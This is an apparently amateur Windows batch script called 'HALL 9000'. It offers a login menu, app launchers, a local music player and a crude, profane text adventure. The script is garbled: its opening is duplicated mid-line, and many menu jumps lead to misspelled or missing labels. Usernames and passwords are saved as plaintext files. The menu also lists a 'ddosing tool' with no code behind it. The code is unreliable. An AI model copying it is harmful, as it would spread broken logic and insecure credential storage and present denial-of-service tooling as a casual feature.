@echo off

:start1
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected (@echo off

:start1
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected 
echo =======================
echo   W  E  L  C  O  M  E
echo =======================
echo login         (1)
echo register      (2)
echo administrator (3)
echo continue      (4)
echo settings      (5)
echo exit          (6)
set /p userin1=ENTER:
if %userin1%== 1 goto begin1
if %userin1%== 2 goto newuser
if %userin1%== 3 goto login2
if %userin1%== 6 goto exit 
if %userin1%== 4 goto hl9ks
if %userin1%== 5 goto settings123
goto start1

:settings123
echo.
echo choose color
echo blue   (1)
echo green  (2)
echo yellow (3)
echo purple (4)
echo red    (5)
set /p clrchs12=ENTER:
if %clrchs12%== 1 goto clrB
if %clrchs12%== 2 goto clrG
if %clrchs12%== 3 goto clrY
if %clrchs12%== 4 goto clrP
if %clrchs12%== 5 goto clrR
goto settigns123

:clrB
color 03
goto start1

:clrG
color 02
goto start1

:clrY
color 06
goto start1

:clrP
color 05
goto start1

:clrR
color 04
goto start1


:newuser2
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>ficou.txt
echo %userin5%>ficop.txt
cls

:login2
set /p userin6=<ficou.txt
set /p userin7=<ficop.txt
set /p userin8=Username:
set /p userin9=Password:
if %userin8%==%userin6% goto password2
if not %userin8%==%userin6% goto begin1
:password2
if %userin9%==%userin7% goto adminacc
if not %userin9%==%userin7% goto begin1

:newuser
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>username.txt
echo %userin5%>password.txt
goto begin1

:begin1
set /p userin2=<username.txt
set /p userin3=<password.txt
set /p userin4=Username:
set /p userin5=Password:
if %userin4%==%userin2% goto password
if not %userin4%==%userin2% goto begin1
:password
if %userin5%==%userin3% goto begin2
if not %userin5%==%userin3% goto begin1

:begin2
cls
echo ===============================
echo   WELCOME %userin4% WELCOME
echo ===============================
echo.
echo choose command:
echo continue  (1)
echo customise (2)
echo exit      (3)
set /p cmd=ENTER:
if %cmd%== 1 goto hl9k
if %cmd%== 2 goto colorhl9k
if %cmd%== 3 goto exit
goto begin2

:colorhl9k
pause
echo please instert the number of the color you want
echo blue   (1)
echo green  (2)
echo yellow (3)
echo purple (4)
echo red    (5)
set /p clrchs=ENTER:
if %clrchs%== 1 goto hl9kB
if %clrchs%== 2 goto hl9kG
if %clrchs%== 3 goto hl9kY
if %clrchs%== 4 goto hl9kP
if %clrchs%== 5 goto hl9kR
goto colorhl9k
 
:hl9ks
pause
echo
echo ==================================
echo   H A L L 9 0 0 0   S I M P L E
echo ==================================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1) music-provides a music player                             
echo (2) skype-opens skype
echo (3) chrome-opens google.com
echo (4) steam-opens steam
echo (5) viber-opens viber
set /p com=command:
if "%com%"=="2" goto skype1
if "%com%"=="3" goto chrome1
if "%com%"=="4" goto steam1
if "%com%"=="5" goto viber1
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9ks
 
:hl9kB
pause
color 03
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
echo (14) pc utiliy-3dMark,Wallpaper Engine,Control Panel
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="14" goto pcu1
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kB

:hl9kG
pause
color 02
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
echo (14) pc utiliy-3dMark,Wallpaper Engine,Control Panel
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="14" goto pcu1
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kG

:hl9kR
pause
color 04
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
echo (14) pc utiliy-3dMark,Wallpaper Engine,Control Panel
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="14" goto pcu1
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kR

:hl9kY
pause
color 06
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
echo (14) pc utiliy-3dMark,Wallpaper Engine,Control Panel
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="14" goto pcu1
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kY

:hl9kP
pause
color 05
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
echo (14) pc utiliy-3dMark,Wallpaper Engine,Control Panel
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="14" goto pcu1
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kP
 
:hl9k
pause
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
echo (14) pc utiliy-3dMark,Wallpaper Engine,Control Panel
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="14" goto pcu1
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9k























:pcu1
echo.
echo 3DMark                    (1)
echo Wallpaper Engine          (2)
echo Control Panel             (3)
set /p pu=
if %pu%== 1 goto 3dm
if %pu%== 2 goto wlpe
if %pu%== 3 cnp 

:3dm
echo.
if %pu%== 1 start steam://rungameid/223850 
pause
goto hl9k

:wlpe
echo.
if %pu%== 2 start steam://rungameid/431960 
pause
goto hl9k

:cnp
echo.
if %pu%== 3 start Control Panel
pause 
goto hl9k

:musicplayer2
echo.
echo please insert the number of the song you want
echo back-(back)
echo exit-(exit)
echo tales from the borderlands-kiss the sky     (1)
echo tales from the borderlands-my silver lining (2)
echo ed sheeran-castle on the hill               (3)
echo ed sheeran-shape of you                     (4)
echo sia-move your body                          (5)
echo david guetta ft. sia-beautiful people say   (6)
echo david guetta-would i lie to you             (7)
echo carnage ft. timmy trumpet-toca bass boosted (8)
echo rocket league-seeing whats next             (9)
echo rocket league-we speak chinese              (10)
echo rocket league-solar eclipse                 (11)
echo the last of us 2-through the valley         (12)
echo alessia cara-scars to your beautiful        (13)
echo rag'n'bone man-human                        (14)
echo david guetta-light my body up               (15)
echo imagine dragons-levitate                    (16)
echo imagine dragons-beliver                     (17)
echo lorde-green light                           (18)
echo lp-lost on you swanky tunes remix           (19)
echo martin garrix-scared to be lonely           (20)
echo martin garrix-in the name of love           (21)
echo martin garrix-bouncy bob                    (22)
echo ariana grande-side to side                  (23)
echo daft punk-get lucky                         (24)
set /p mc=ENTER:
if %mc%== 1 goto m1
if %mc%== 2 goto m2
if %mc%== 3 goto m3
if %mc%== 4 goto m4
if %mc%== 5 goto m5
if %mc%== 6 goto m6
if %mc%== 7 goto m7
if %mc%== 8 goto m8
if %mc%== 9 goto m9
if %mc%== 10 goto m10
if %mc%== 11 goto m11
if %mc%== 12 goto m12
if %mc%== 13 goto m13
if %mc%== 14 goto m14
if %mc%== 15 goto m15
if %mc%== 16 goto m16
if %mc%== 17 goto m17
if %mc%== 18 goto m18
if %mc%== 19 goto m19
if %mc%== 20 goto m20
if %mc%== 21 goto m21
if %mc%== 22 goto m22
if %mc%== 23 goto m23
if %mc%== 24 goto m24
if %mc%== exit goto exit
if %mc%== back goto hl9k

:m1
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Tales from the borderlands episode 2 intro song-Shawn Lee's Ping Pong Orchestra feat. Nino Mochella - Kiss The Sky.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m2
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Tales From The Borderlands Episode 5 End Credits Song (My Silver Lining).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m3
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Castle On The Hill Official Lyric Video (1).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m4
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Shape Of You Official Lyric Video.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m5
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Sia - Move Your Body (Alan Walker Remix) Audio.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m6
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"David Guetta - Beautiful People Say ft. Sia Lyrics (1).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m7
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"David Guetta_ Cedric Gervais & Chris Willis - Would I Lie To You (Lyric Video) (1).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m8
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Carnage feat. Timmy Trumpet & KSHMR - Toca Bass Boosted (1).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m9
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Seeing What's Next.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m11
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Rocket League Music Solar eclipse.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m10
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"We speak Chinese-Rocket League OST.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m12
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"The Last Of Us Part II-Ashley Johnson (Ellie) - Through The Valley Extended Version.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m13
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Alessia Cara - Scars To Your Beautiful (Audio).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m14
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Rag'n'Bone Man - Human (Rudimental Remix) Official Video.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m15
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Guetta - Beautiful People Say ft. Sia Lyrics (1).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m16
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Imagine Dragons - Levitate (Audio).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m17
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Imagine Dragons - Believer (Audio).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m18
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Lorde - Green Light.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m19
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"LP - Lost On You (Swanky Tunes & Going Deeper Remix).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m20
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Martin Garrix & Dua Lipa - Scared To Be Lonely (Lyric Video).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m21
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Martin Garrix & Bebe Rexha - In The Name Of Love (Official Audio).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m22
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Martin Garrix - Bouncybob (Feat. Justin Mylo & Mesto) FREE DOWNLOAD.mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m23
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Ariana Grande ft. Nicki Minaj - Side To Side (Lyrics).mp3"
if %chs2000%== 2 start http://www.mp3juices.cc/
pause
goto musicplayer2
:m24
echo.
echo play song     (1)
echo download song (2)
set /p chs2000=ENTER:
if %chs2000%== 1 start C:\Users\"fico pico"\Music\music\"Daft Punk - Get Lucky (Official Audio) ft. Pharrell Williams, Nile Rodgers.mp3
if %chs2000%== 2 start http://www.mp3juices.cc/

:menu
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected 
pause
echo welcome to The Advanture
echo begin (1)
echo exit  (2)
set /p menu=ENTER:
if %menu%== 1 goto home
if %menu%== 2 goto exit

:home
cls
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
echo complete
cls
pause
echo.
echo -------------------------------------------------
echo       !W    E    L    C    O    M    E!
echo -------------------------------------------------
echo start     (1)
echo exit      (2)
echo settings  (3)
set /p chose=
if %chose%== 1 goto begin
if %chose%== 2 goto exit
if %chose%== 3 goto colors

:exit
exit

:colors
echo ----------------------------------------------------
echo        S    E    T    T    I    N    G    S
echo ----------------------------------------------------
echo please type in the color of your choosing
set /p clr=BLUE,RED,YELLOW,GREEN,PURPLE:
if %clr%== blue goto beginB
if %clr%== red goto beginR
if %clr%== yellow goto beginY
if %clr%== green goto beginG
if %clr%== purple goto beginP

:begin
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginB
color 03
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginR
color 04
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginG
color 02
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginY
color 06
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginP
color 05
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto prologue
if %chs%== 3 goto exit

:tutorial
echo the controls for this game are simple
echo when asked where to go type in the direction you want to go in
echo you can choose any direction but you cant go back
echo example:forward\left\right
echo as for fighting you use the numbers on your keyboard
echo example:attack1--key "1"
echo when your ready continue
echo continue (1)
echo exit     (2)
set /p chs2=
if %chs2%== 1 goto prolouge
if %chs2%== 2 goto exit

:prolouge
echo.
echo Narator:Hello,i am the narator
echo Narator:I will be guiding you through this "amaechoing" advanture
echo Narator:whell if it was amaechoing than it would have been text based 
echo Narator:never mind,you have been put in a scenario where you save the...world..
echo Narator:really...really!
echo Narator:Thats the best this fuck could do,i mean come on,again,a end of the world scenarion
echo Narator:Im out of here!
echo Narator:NARATOR Out!
echo type in start to whell...start
set /p chs3=
if %chs3%== start goto encounter
goto prologue
 
:encounter
 
                                 `                  
echo                             .+yhs:                
echo                          .+yhhhhhhh+-             
echo                       `/yhhhhhhhhhhhhy/`          
echo                    `/shhhhhhhhhhhhhhhhhhs:`       
echo                  :sddhhhhhhhhhhhhhhhhhhhhhh+-     
echo               -ohdoohdddhhhhhhhhhhhhhhhhhhhhhy/`  
echo            `/yds:.--.:sdddhhhhhhhhhhhhhhhhhhddd:  
echo          :sdy/` +soos/ `/ydddhhhhhhhhhhhhddddo:   
echo       .ohho.    /soos:    .+hddhhhhhhhddddy/:     
echo    `/yds:`       `..`        :sdddhhdddyooo:+.    
echo   `dyo` --:-:-.        .-:-:-- `oymdho///oyhhhy/  
echo    . :  /:+:+-:        :-+:/:/  : o++/+:-yhhhhhh- 
echo    :o+  oo::+/:        /++:/++  : ++yyhsohhhhhhho 
echo    ohho ./:+//:/        /://+:+` -`+hhhhhhhhhhhhho 
echo   :hhho `......`        .......  - yhhhhhhdhhhhhh+ 
echo   +hhho        :---::---:        -`hhhhhhhhhhhhhh- 
echo   +hhh+        +::://:::+        :`hhhhhhhhhhhhhy  
echo   /hhh+        +::://:::+        : yhhhhhhdhhhhh/  
echo   -hhh+        +::+o+/::+        : ohhhhhh/.-:-.   
echo    yhh+        +::://:::+        :.+hhhhhy`        
echo    :+oo------.-+::://:::+-----...+--/+o++-         
echo      .........----------........-   


echo          what a wonderfull day...
echo          lets go to work.
set /p drc=direction:
if %drc%==forwad goto work
if %drc%==left goto work
if %drc%==right goto work 

:work
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2>nul
cls
pause
echo ....`                                                     
echo              .+-/.--://--                                                 
echo              /..-::::::.+.                                                
echo              `+::-.``..-+                                                 
echo               +   ....+.                                                  
echo               +       .:                                                  
echo               +        +                                                  
echo              `/        o                                                  
echo              :.        o                                                  
echo              +         o`                                                 
echo              +         :-                                                 
echo              +         ./ ...-.`                                     .    
echo             `/          o-/-/-.o       .-:`   .::`  `-:/`  `::    .::-:`  
echo -.          s:- :  +-------`  -/::.  :/:-   :/:-  ::::`   `+: 
echo      `/+:-.-.+`         o .---++/:    -/+`   -/+`  `/+-    ::/`   -:-// / 
echo     :: -:-.--+:--.-----:.   ./.  .+`-/.  :-`/.  /-::  ./`::   /--:.+:`  / 
echo .+`o-.....--------......./....../:-----:/--:::/:::::://:::/:o-:-.    / 
echo    o  ++-------.....+    .------`   `o---------..............:-/``      + 
echo +``++.```````````s:://:---   .-. `+.......................--: `.... :- 
echo    o  +----------:/:`        -:`  `:.+-----------------------:.:---..-:o  
echo    o  +         /:             ::   /`    `+/:` :/:-`          :`//---``: 
echo    o``+       `+`               `/   +   `/`//`-/`o:`      ..` :`+:+/// + 
echo    o `+       +      `---..`     `+  -/``+ /...+`-:.-----.+:.s.:`/::/o:-- 
echo   `+.`+      +`    ::.  : `-:.    .:/....o -/::s``o---------:` : .+-:---  
echo /--   +      o   `+`    -    ::    /`-+:.o `/` :. +            : :-       
echo :-     +      o   +   --`-`--  +`   /  `: :. /  -- +            -/.        
echo ./     +     `+  `/   .- - -.  -:   /  .+-// o::/+.o------------:`         
echo .-----:::::::o..//....../---..:o---o//.   .-`    `                        
echo              ```````````````````````
echo. 
echo You:whell that was a nother day of work i guess...
echo You:bye everyone.
pause
goto apocolipse

:apocolipse
echo              .:syhhy:       
echo              ohysyooh+       
echo              `y+/+-+s`       
echo               .:/+::-        
echo :/+/:-`        `:s/-+//-`      
echo./smmmds     :/y/o//y+:/.     
echo   +sms/+..-:+:+---oo++-:-    
echo    :s//y:::++/o---os -o+/    
echo              ::--:hy/ .+/`   
echo              /ysoysy+  `::-. 
echo              odddddh   :/+s+ 
echo             :hhdhhhho    ..  
echo            .hhddsdhhh:       
echo            yhhdy .hhhd-      
echo           `hhdh+  .hhhd+     
echo            shddh+  .dhhd+    
echo            .hhhdh-  /dhhdy   
echo             :dddd:   yddds   
echo           :mmmNmd    oNNNy   
echo           -oo++-     smmdd-

echo     GIVE ME YOUR MONEY!
echo give money (1)
echo fight      (2)
set /p thg=ENTER:
if %thg%== 1 goto pussy1
if %thg%== 2 goto fight1

:pussy1
echo You:ok,ok...here you go,just dont hurt me...pls...
set /p drc1=DIRECTION:
if %drc1%==forward goto home1
if %drc1%==left goto home1
if %drc1%==right goto home1

:home1
echo.
echo whell that was a bad decision
echo i guess you cant go on the advanture now
echo bye you fuck
pause
goto exit

:fight1
cls
echo attack    (1)
echo pussy out (2)
set /p atc=ENTER:
if %atc%== 1 goto attack1
if %atc%== 2 goto pussy1
goto fight1

:attack1
cls
echo. 
echo Narator:You punched him in the balls as he screamed and ran away
echo Narator:you proudly went home with your money
echo.
echo Oh hey,im back btw.
echo explenation (1)
echo continue    (2)
set /p chs4=
if %chs4%== 1 goto explenation1
if %chs4%== 2 goto home1

:explenation1
echo.
echo Narator:whell you see...
echo Narator:i wasnt really allowed to go away
echo Narator:i kind of signed a contract
echo Narator:so i had to stay
echo Narator:never mind me,lets continue with the story
set /p chs5=Continue (Y/N):
if %chs5%== Y goto obduction
if %chs5%== N goto exit
goto explenation1

:obduction 
pause
echo.
echo                                                             
echo                                                                           
echo                                                                           
echo                               ```        `` `                             
echo                              `.```.`  `....::````                         
echo                         `         `---:.```````````                       
echo                       ``        ``//--/o-```````````                      
echo                      ``  ````````:sooo/so````````````                     
echo                 ```.`````....-++::sssssso-+o+.......``.``                 
echo           ``..--:://-..`````.+oosssssssssss/o:`````...////::-.`           
echo       `.----:://++++-```..-:++./yssssssssss..+/:-..``.++++++++//:-`       
echo   `.-:----//++++++++/-...--::--/sssssssssss------...-/+++++++++++++/:.`   
echo `-:-..-///:://++++++++/:--------+++++o++++/-------:/++++++++++////++++/:. 
echo./++//++++/:-::/+++++++++++//////////////////////++++++++++++/::--/+++oo+/.
echo  .:osyysoo+++++++++++++++++++++++/////+++++++++++++++++++++++++oosyys+:.  
echo     `-/oyyhyyysooo++++++++++++++/-.-::/+++++++++++++++++ossyhhhhy+:.`     
echo         `.:+syyhhhyyyyssooo+++++++++++++++++++ooosssyyyhhhhyo/-`          
echo              `.-/+osyhhhhhhhhyyyyyyyyyyyyyyyhhhhhhhhho+/-.`               
echo                    -yhhhhhhhhhhhhhhhhhhhhhhhhdddddd+                     
echo                     `/syhhhhhhhhhhhhhhhhhhddddddhs-                      
echo                        `-/oyyyhhhhhhhhhhhhhddhyo:.                        
echo                             .-::/+++++++//:-.`       
echo.           
echo Alians:Hello
